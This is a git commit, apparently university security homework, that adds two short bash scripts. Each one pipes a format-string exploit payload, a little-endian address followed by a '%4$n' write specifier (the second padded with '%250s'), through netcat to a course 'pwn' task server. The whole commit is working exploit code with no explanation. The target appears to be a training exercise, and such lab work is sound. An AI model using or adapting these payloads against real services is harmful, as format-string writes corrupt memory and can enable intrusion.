11d6527e392101e4a73e90ee4046e4f016d73c6c
Mikhail-off <hukutoc46@gmail.com>
2018-11-29 21:05:36 +0300

    init

---
+++ HW3/task1-A.bash
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+echo -e '5\xd4\xb1\x04\x08%4$n' | nc pwn_task.hse.seclab.cs.msu.su 777
---
+++ HW3/task1-B.bash
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+echo -e '5\xd8\xb1\x04\x08%250s%4$n' | nc pwn_task.hse.seclab.cs.msu.su 777
